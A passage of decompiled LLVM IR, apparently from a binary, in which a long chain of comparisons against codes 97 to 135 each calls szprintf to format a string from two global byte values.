  %v8_bdf0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c674.161 to i32), i32 %v4_bdf0, i32 %v6_bdf0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdf4

dec_label_pc_bdf4:                                ; preds = %dec_label_pc_bdc0, %dec_label_pc_bdcc
  %v7_bdf8 = icmp eq i32 %v2_a7e4, 97
  br i1 %v7_bdf8, label %dec_label_pc_be00, label %dec_label_pc_be28

dec_label_pc_be00:                                ; preds = %dec_label_pc_bdf4
  %v3_be0c = load i8, i8* @global_var_28c59.70, align 1
  %v3_be18 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_be24 = sext i8 %v3_be0c to i32
  %v6_be24 = sext i8 %v3_be18 to i32
  %v8_be24 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c984.260 to i32), i32 %v4_be24, i32 %v6_be24, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be28

dec_label_pc_be28:                                ; preds = %dec_label_pc_bdf4, %dec_label_pc_be00
  %v7_be2c = icmp eq i32 %v2_a7e4, 98
  br i1 %v7_be2c, label %dec_label_pc_be34, label %dec_label_pc_be5c

dec_label_pc_be34:                                ; preds = %dec_label_pc_be28
  %v3_be40 = load i8, i8* @global_var_28c59.70, align 1
  %v3_be4c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_be58 = sext i8 %v3_be40 to i32
  %v6_be58 = sext i8 %v3_be4c to i32
  %v8_be58 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c994.262 to i32), i32 %v4_be58, i32 %v6_be58, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be5c

dec_label_pc_be5c:                                ; preds = %dec_label_pc_be28, %dec_label_pc_be34
  %v7_be60 = icmp eq i32 %v2_a7e4, 99
  br i1 %v7_be60, label %dec_label_pc_be68, label %dec_label_pc_be90

dec_label_pc_be68:                                ; preds = %dec_label_pc_be5c
  %v3_be74 = load i8, i8* @global_var_28c59.70, align 1
  %v3_be80 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_be8c = sext i8 %v3_be74 to i32
  %v6_be8c = sext i8 %v3_be80 to i32
  %v8_be8c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c9a4.264 to i32), i32 %v4_be8c, i32 %v6_be8c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be90

dec_label_pc_be90:                                ; preds = %dec_label_pc_be5c, %dec_label_pc_be68
  %v7_be94 = icmp eq i32 %v2_a7e4, 100
  br i1 %v7_be94, label %dec_label_pc_be9c, label %dec_label_pc_bec4

dec_label_pc_be9c:                                ; preds = %dec_label_pc_be90
  %v3_bea8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_beb4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bec0 = sext i8 %v3_bea8 to i32
  %v6_bec0 = sext i8 %v3_beb4 to i32
  %v8_bec0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c9b4.266 to i32), i32 %v4_bec0, i32 %v6_bec0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bec4

dec_label_pc_bec4:                                ; preds = %dec_label_pc_be90, %dec_label_pc_be9c
  %v7_bec8 = icmp eq i32 %v2_a7e4, 101
  br i1 %v7_bec8, label %dec_label_pc_bed0, label %dec_label_pc_bef8

dec_label_pc_bed0:                                ; preds = %dec_label_pc_bec4
  %v3_bedc = load i8, i8* @global_var_28c59.70, align 1
  %v3_bee8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bef4 = sext i8 %v3_bedc to i32
  %v6_bef4 = sext i8 %v3_bee8 to i32
  %v8_bef4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c9c4.268 to i32), i32 %v4_bef4, i32 %v6_bef4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bef8

dec_label_pc_bef8:                                ; preds = %dec_label_pc_bec4, %dec_label_pc_bed0
  %v7_befc = icmp eq i32 %v2_a7e4, 102
  br i1 %v7_befc, label %dec_label_pc_bf04, label %dec_label_pc_bf2c

dec_label_pc_bf04:                                ; preds = %dec_label_pc_bef8
  %v3_bf10 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bf1c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bf28 = sext i8 %v3_bf10 to i32
  %v6_bf28 = sext i8 %v3_bf1c to i32
  %v8_bf28 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c9d4.270 to i32), i32 %v4_bf28, i32 %v6_bf28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf2c

dec_label_pc_bf2c:                                ; preds = %dec_label_pc_bef8, %dec_label_pc_bf04
  %v7_bf30 = icmp eq i32 %v2_a7e4, 103
  br i1 %v7_bf30, label %dec_label_pc_bf38, label %dec_label_pc_bf60

dec_label_pc_bf38:                                ; preds = %dec_label_pc_bf2c
  %v3_bf44 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bf50 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bf5c = sext i8 %v3_bf44 to i32
  %v6_bf5c = sext i8 %v3_bf50 to i32
  %v8_bf5c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c9e0.272 to i32), i32 %v4_bf5c, i32 %v6_bf5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf60

dec_label_pc_bf60:                                ; preds = %dec_label_pc_bf2c, %dec_label_pc_bf38
  %v7_bf64 = icmp eq i32 %v2_a7e4, 104
  br i1 %v7_bf64, label %dec_label_pc_bf6c, label %dec_label_pc_bf94

dec_label_pc_bf6c:                                ; preds = %dec_label_pc_bf60
  %v3_bf78 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bf84 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bf90 = sext i8 %v3_bf78 to i32
  %v6_bf90 = sext i8 %v3_bf84 to i32
  %v8_bf90 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c9f0.274 to i32), i32 %v4_bf90, i32 %v6_bf90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf94

dec_label_pc_bf94:                                ; preds = %dec_label_pc_bf60, %dec_label_pc_bf6c
  %v7_bf98 = icmp eq i32 %v2_a7e4, 105
  br i1 %v7_bf98, label %dec_label_pc_bfa0, label %dec_label_pc_bfc8

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf94
  %v3_bfac = load i8, i8* @global_var_28c59.70, align 1
  %v3_bfb8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bfc4 = sext i8 %v3_bfac to i32
  %v6_bfc4 = sext i8 %v3_bfb8 to i32
  %v8_bfc4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ca00.276 to i32), i32 %v4_bfc4, i32 %v6_bfc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bfc8

dec_label_pc_bfc8:                                ; preds = %dec_label_pc_bf94, %dec_label_pc_bfa0
  %v7_bfcc = icmp eq i32 %v2_a7e4, 106
  br i1 %v7_bfcc, label %dec_label_pc_bfd4, label %dec_label_pc_bffc

dec_label_pc_bfd4:                                ; preds = %dec_label_pc_bfc8
  %v3_bfe0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bfec = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bff8 = sext i8 %v3_bfe0 to i32
  %v6_bff8 = sext i8 %v3_bfec to i32
  %v8_bff8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1ca10.278 to i32), i32 %v4_bff8, i32 %v6_bff8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_bfc8, %dec_label_pc_bfd4
  %v7_c000 = icmp eq i32 %v2_a7e4, 107
  br i1 %v7_c000, label %dec_label_pc_c008, label %dec_label_pc_c030

dec_label_pc_c008:                                ; preds = %dec_label_pc_bffc
  %v3_c014 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c020 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c02c = sext i8 %v3_c014 to i32
  %v6_c02c = sext i8 %v3_c020 to i32
  %v8_c02c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ca1c.280 to i32), i32 %v4_c02c, i32 %v6_c02c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c030

dec_label_pc_c030:                                ; preds = %dec_label_pc_bffc, %dec_label_pc_c008
  %v7_c034 = icmp eq i32 %v2_a7e4, 108
  br i1 %v7_c034, label %dec_label_pc_c03c, label %dec_label_pc_c064

dec_label_pc_c03c:                                ; preds = %dec_label_pc_c030
  %v3_c048 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c054 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c060 = sext i8 %v3_c048 to i32
  %v6_c060 = sext i8 %v3_c054 to i32
  %v8_c060 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ca2c.282 to i32), i32 %v4_c060, i32 %v6_c060, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c064

dec_label_pc_c064:                                ; preds = %dec_label_pc_c030, %dec_label_pc_c03c
  %v7_c068 = icmp eq i32 %v2_a7e4, 109
  br i1 %v7_c068, label %dec_label_pc_c070, label %dec_label_pc_c098

dec_label_pc_c070:                                ; preds = %dec_label_pc_c064
  %v3_c07c = load i8, i8* @global_var_28c59.70, align 1
  %v3_c088 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c094 = sext i8 %v3_c07c to i32
  %v6_c094 = sext i8 %v3_c088 to i32
  %v8_c094 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ca3c.284 to i32), i32 %v4_c094, i32 %v6_c094, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c098

dec_label_pc_c098:                                ; preds = %dec_label_pc_c064, %dec_label_pc_c070
  %v7_c09c = icmp eq i32 %v2_a7e4, 110
  br i1 %v7_c09c, label %dec_label_pc_c0a4, label %dec_label_pc_c0cc

dec_label_pc_c0a4:                                ; preds = %dec_label_pc_c098
  %v3_c0b0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c0bc = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c0c8 = sext i8 %v3_c0b0 to i32
  %v6_c0c8 = sext i8 %v3_c0bc to i32
  %v8_c0c8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ca4c.286 to i32), i32 %v4_c0c8, i32 %v6_c0c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0cc

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c098, %dec_label_pc_c0a4
  %v7_c0d0 = icmp eq i32 %v2_a7e4, 111
  br i1 %v7_c0d0, label %dec_label_pc_c0d8, label %dec_label_pc_c100

dec_label_pc_c0d8:                                ; preds = %dec_label_pc_c0cc
  %v3_c0e4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c0f0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c0fc = sext i8 %v3_c0e4 to i32
  %v6_c0fc = sext i8 %v3_c0f0 to i32
  %v8_c0fc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ca5c.288 to i32), i32 %v4_c0fc, i32 %v6_c0fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c100

dec_label_pc_c100:                                ; preds = %dec_label_pc_c0cc, %dec_label_pc_c0d8
  %v7_c104 = icmp eq i32 %v2_a7e4, 112
  br i1 %v7_c104, label %dec_label_pc_c10c, label %dec_label_pc_c134

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c100
  %v3_c118 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c124 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c130 = sext i8 %v3_c118 to i32
  %v6_c130 = sext i8 %v3_c124 to i32
  %v8_c130 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ca6c.290 to i32), i32 %v4_c130, i32 %v6_c130, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c134

dec_label_pc_c134:                                ; preds = %dec_label_pc_c100, %dec_label_pc_c10c
  %v7_c138 = icmp eq i32 %v2_a7e4, 113
  br i1 %v7_c138, label %dec_label_pc_c140, label %dec_label_pc_c168

dec_label_pc_c140:                                ; preds = %dec_label_pc_c134
  %v3_c14c = load i8, i8* @global_var_28c59.70, align 1
  %v3_c158 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c164 = sext i8 %v3_c14c to i32
  %v6_c164 = sext i8 %v3_c158 to i32
  %v8_c164 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ca7c.292 to i32), i32 %v4_c164, i32 %v6_c164, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c168

dec_label_pc_c168:                                ; preds = %dec_label_pc_c134, %dec_label_pc_c140
  %v7_c16c = icmp eq i32 %v2_a7e4, 114
  br i1 %v7_c16c, label %dec_label_pc_c174, label %dec_label_pc_c19c

dec_label_pc_c174:                                ; preds = %dec_label_pc_c168
  %v3_c180 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c18c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c198 = sext i8 %v3_c180 to i32
  %v6_c198 = sext i8 %v3_c18c to i32
  %v8_c198 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ca8c.294 to i32), i32 %v4_c198, i32 %v6_c198, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c19c

dec_label_pc_c19c:                                ; preds = %dec_label_pc_c168, %dec_label_pc_c174
  %v7_c1a0 = icmp eq i32 %v2_a7e4, 115
  br i1 %v7_c1a0, label %dec_label_pc_c1a8, label %dec_label_pc_c1d0

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c19c
  %v3_c1b4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c1c0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c1cc = sext i8 %v3_c1b4 to i32
  %v6_c1cc = sext i8 %v3_c1c0 to i32
  %v8_c1cc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ca9c.296 to i32), i32 %v4_c1cc, i32 %v6_c1cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c1d0

dec_label_pc_c1d0:                                ; preds = %dec_label_pc_c19c, %dec_label_pc_c1a8
  %v7_c1d4 = icmp eq i32 %v2_a7e4, 116
  br i1 %v7_c1d4, label %dec_label_pc_c1dc, label %dec_label_pc_c204

dec_label_pc_c1dc:                                ; preds = %dec_label_pc_c1d0
  %v3_c1e8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c1f4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c200 = sext i8 %v3_c1e8 to i32
  %v6_c200 = sext i8 %v3_c1f4 to i32
  %v8_c200 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1caac.298 to i32), i32 %v4_c200, i32 %v6_c200, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c204

dec_label_pc_c204:                                ; preds = %dec_label_pc_c1d0, %dec_label_pc_c1dc
  %v7_c208 = icmp eq i32 %v2_a7e4, 117
  br i1 %v7_c208, label %dec_label_pc_c210, label %dec_label_pc_c238

dec_label_pc_c210:                                ; preds = %dec_label_pc_c204
  %v3_c21c = load i8, i8* @global_var_28c59.70, align 1
  %v3_c228 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c234 = sext i8 %v3_c21c to i32
  %v6_c234 = sext i8 %v3_c228 to i32
  %v8_c234 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cabc.300 to i32), i32 %v4_c234, i32 %v6_c234, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c238

dec_label_pc_c238:                                ; preds = %dec_label_pc_c204, %dec_label_pc_c210
  %v7_c23c = icmp eq i32 %v2_a7e4, 118
  br i1 %v7_c23c, label %dec_label_pc_c244, label %dec_label_pc_c26c

dec_label_pc_c244:                                ; preds = %dec_label_pc_c238
  %v3_c250 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c25c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c268 = sext i8 %v3_c250 to i32
  %v6_c268 = sext i8 %v3_c25c to i32
  %v8_c268 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cacc.302 to i32), i32 %v4_c268, i32 %v6_c268, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c26c

dec_label_pc_c26c:                                ; preds = %dec_label_pc_c238, %dec_label_pc_c244
  %v7_c270 = icmp eq i32 %v2_a7e4, 119
  br i1 %v7_c270, label %dec_label_pc_c278, label %dec_label_pc_c2a0

dec_label_pc_c278:                                ; preds = %dec_label_pc_c26c
  %v3_c284 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c290 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c29c = sext i8 %v3_c284 to i32
  %v6_c29c = sext i8 %v3_c290 to i32
  %v8_c29c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cadc.304 to i32), i32 %v4_c29c, i32 %v6_c29c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2a0

dec_label_pc_c2a0:                                ; preds = %dec_label_pc_c26c, %dec_label_pc_c278
  %v7_c2a4 = icmp eq i32 %v2_a7e4, 120
  br i1 %v7_c2a4, label %dec_label_pc_c2ac, label %dec_label_pc_c2d4

dec_label_pc_c2ac:                                ; preds = %dec_label_pc_c2a0
  %v3_c2b8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c2c4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c2d0 = sext i8 %v3_c2b8 to i32
  %v6_c2d0 = sext i8 %v3_c2c4 to i32
  %v8_c2d0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1caec.306 to i32), i32 %v4_c2d0, i32 %v6_c2d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2d4

dec_label_pc_c2d4:                                ; preds = %dec_label_pc_c2a0, %dec_label_pc_c2ac
  %v7_c2d8 = icmp eq i32 %v2_a7e4, 121
  br i1 %v7_c2d8, label %dec_label_pc_c2e0, label %dec_label_pc_c308

dec_label_pc_c2e0:                                ; preds = %dec_label_pc_c2d4
  %v3_c2ec = load i8, i8* @global_var_28c59.70, align 1
  %v3_c2f8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c304 = sext i8 %v3_c2ec to i32
  %v6_c304 = sext i8 %v3_c2f8 to i32
  %v8_c304 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ca2c.282 to i32), i32 %v4_c304, i32 %v6_c304, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c308

dec_label_pc_c308:                                ; preds = %dec_label_pc_c2d4, %dec_label_pc_c2e0
  %v7_c30c = icmp eq i32 %v2_a7e4, 122
  br i1 %v7_c30c, label %dec_label_pc_c314, label %dec_label_pc_c33c

dec_label_pc_c314:                                ; preds = %dec_label_pc_c308
  %v3_c320 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c32c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c338 = sext i8 %v3_c320 to i32
  %v6_c338 = sext i8 %v3_c32c to i32
  %v8_c338 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cafc.308 to i32), i32 %v4_c338, i32 %v6_c338, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c33c

dec_label_pc_c33c:                                ; preds = %dec_label_pc_c308, %dec_label_pc_c314
  %v7_c340 = icmp eq i32 %v2_a7e4, 123
  br i1 %v7_c340, label %dec_label_pc_c348, label %dec_label_pc_c370

dec_label_pc_c348:                                ; preds = %dec_label_pc_c33c
  %v3_c354 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c360 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c36c = sext i8 %v3_c354 to i32
  %v6_c36c = sext i8 %v3_c360 to i32
  %v8_c36c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1cb0c.310 to i32), i32 %v4_c36c, i32 %v6_c36c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c370

dec_label_pc_c370:                                ; preds = %dec_label_pc_c33c, %dec_label_pc_c348
  %v7_c374 = icmp eq i32 %v2_a7e4, 124
  br i1 %v7_c374, label %dec_label_pc_c37c, label %dec_label_pc_c3a4

dec_label_pc_c37c:                                ; preds = %dec_label_pc_c370
  %v3_c388 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c394 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c3a0 = sext i8 %v3_c388 to i32
  %v6_c3a0 = sext i8 %v3_c394 to i32
  %v8_c3a0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cb18.312 to i32), i32 %v4_c3a0, i32 %v6_c3a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3a4

dec_label_pc_c3a4:                                ; preds = %dec_label_pc_c370, %dec_label_pc_c37c
  %v7_c3a8 = icmp eq i32 %v2_a7e4, 125
  br i1 %v7_c3a8, label %dec_label_pc_c3b0, label %dec_label_pc_c3d8

dec_label_pc_c3b0:                                ; preds = %dec_label_pc_c3a4
  %v3_c3bc = load i8, i8* @global_var_28c59.70, align 1
  %v3_c3c8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c3d4 = sext i8 %v3_c3bc to i32
  %v6_c3d4 = sext i8 %v3_c3c8 to i32
  %v8_c3d4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cb28.314 to i32), i32 %v4_c3d4, i32 %v6_c3d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3d8

dec_label_pc_c3d8:                                ; preds = %dec_label_pc_c3a4, %dec_label_pc_c3b0
  %v7_c3dc = icmp eq i32 %v2_a7e4, 126
  br i1 %v7_c3dc, label %dec_label_pc_c3e4, label %dec_label_pc_c40c

dec_label_pc_c3e4:                                ; preds = %dec_label_pc_c3d8
  %v3_c3f0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c3fc = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c408 = sext i8 %v3_c3f0 to i32
  %v6_c408 = sext i8 %v3_c3fc to i32
  %v8_c408 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cb18.312 to i32), i32 %v4_c408, i32 %v6_c408, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c40c

dec_label_pc_c40c:                                ; preds = %dec_label_pc_c3d8, %dec_label_pc_c3e4
  %v7_c410 = icmp eq i32 %v2_a7e4, 127
  br i1 %v7_c410, label %dec_label_pc_c418, label %dec_label_pc_c440

dec_label_pc_c418:                                ; preds = %dec_label_pc_c40c
  %v3_c424 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c430 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c43c = sext i8 %v3_c424 to i32
  %v6_c43c = sext i8 %v3_c430 to i32
  %v8_c43c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cb38.316 to i32), i32 %v4_c43c, i32 %v6_c43c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c440

dec_label_pc_c440:                                ; preds = %dec_label_pc_c40c, %dec_label_pc_c418
  %v7_c444 = icmp eq i32 %v2_a7e4, 128
  br i1 %v7_c444, label %dec_label_pc_c44c, label %dec_label_pc_c474

dec_label_pc_c44c:                                ; preds = %dec_label_pc_c440
  %v3_c458 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c464 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c470 = sext i8 %v3_c458 to i32
  %v6_c470 = sext i8 %v3_c464 to i32
  %v8_c470 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cb48.318 to i32), i32 %v4_c470, i32 %v6_c470, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c474

dec_label_pc_c474:                                ; preds = %dec_label_pc_c440, %dec_label_pc_c44c
  %v7_c478 = icmp eq i32 %v2_a7e4, 129
  br i1 %v7_c478, label %dec_label_pc_c480, label %dec_label_pc_c4a8

dec_label_pc_c480:                                ; preds = %dec_label_pc_c474
  %v3_c48c = load i8, i8* @global_var_28c59.70, align 1
  %v3_c498 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c4a4 = sext i8 %v3_c48c to i32
  %v6_c4a4 = sext i8 %v3_c498 to i32
  %v8_c4a4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cb58.320 to i32), i32 %v4_c4a4, i32 %v6_c4a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4a8

dec_label_pc_c4a8:                                ; preds = %dec_label_pc_c474, %dec_label_pc_c480
  %v7_c4ac = icmp eq i32 %v2_a7e4, 130
  br i1 %v7_c4ac, label %dec_label_pc_c4b4, label %dec_label_pc_c4dc

dec_label_pc_c4b4:                                ; preds = %dec_label_pc_c4a8
  %v3_c4c0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c4cc = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c4d8 = sext i8 %v3_c4c0 to i32
  %v6_c4d8 = sext i8 %v3_c4cc to i32
  %v8_c4d8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cb68.322 to i32), i32 %v4_c4d8, i32 %v6_c4d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4dc

dec_label_pc_c4dc:                                ; preds = %dec_label_pc_c4a8, %dec_label_pc_c4b4
  %v7_c4e0 = icmp eq i32 %v2_a7e4, 131
  br i1 %v7_c4e0, label %dec_label_pc_c4e8, label %dec_label_pc_c510

dec_label_pc_c4e8:                                ; preds = %dec_label_pc_c4dc
  %v3_c4f4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c500 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c50c = sext i8 %v3_c4f4 to i32
  %v6_c50c = sext i8 %v3_c500 to i32
  %v8_c50c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cb78.324 to i32), i32 %v4_c50c, i32 %v6_c50c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c510

dec_label_pc_c510:                                ; preds = %dec_label_pc_c4dc, %dec_label_pc_c4e8
  %v7_c514 = icmp eq i32 %v2_a7e4, 132
  br i1 %v7_c514, label %dec_label_pc_c51c, label %dec_label_pc_c544

dec_label_pc_c51c:                                ; preds = %dec_label_pc_c510
  %v3_c528 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c534 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c540 = sext i8 %v3_c528 to i32
  %v6_c540 = sext i8 %v3_c534 to i32
  %v8_c540 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cb88.326 to i32), i32 %v4_c540, i32 %v6_c540, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c544

dec_label_pc_c544:                                ; preds = %dec_label_pc_c510, %dec_label_pc_c51c
  %v7_c548 = icmp eq i32 %v2_a7e4, 133
  br i1 %v7_c548, label %dec_label_pc_c550, label %dec_label_pc_c578

dec_label_pc_c550:                                ; preds = %dec_label_pc_c544
  %v3_c55c = load i8, i8* @global_var_28c59.70, align 1
  %v3_c568 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c574 = sext i8 %v3_c55c to i32
  %v6_c574 = sext i8 %v3_c568 to i32
  %v8_c574 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cb98.328 to i32), i32 %v4_c574, i32 %v6_c574, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c578

dec_label_pc_c578:                                ; preds = %dec_label_pc_c544, %dec_label_pc_c550
  %v7_c57c = icmp eq i32 %v2_a7e4, 134
  br i1 %v7_c57c, label %dec_label_pc_c584, label %dec_label_pc_c5ac

dec_label_pc_c584:                                ; preds = %dec_label_pc_c578
  %v3_c590 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c59c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c5a8 = sext i8 %v3_c590 to i32
  %v6_c5a8 = sext i8 %v3_c59c to i32
  %v8_c5a8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cba8.330 to i32), i32 %v4_c5a8, i32 %v6_c5a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5ac

dec_label_pc_c5ac:                                ; preds = %dec_label_pc_c578, %dec_label_pc_c584
  %v7_c5b0 = icmp eq i32 %v2_a7e4, 135
  br i1 %v7_c5b0, label %dec_label_pc_c5b8, label %dec_label_pc_c5e0

dec_label_pc_c5b8:                                ; preds = %dec_label_pc_c5ac
  %v3_c5c4 = load i8, i8* @global_var_28c59.70, align 1
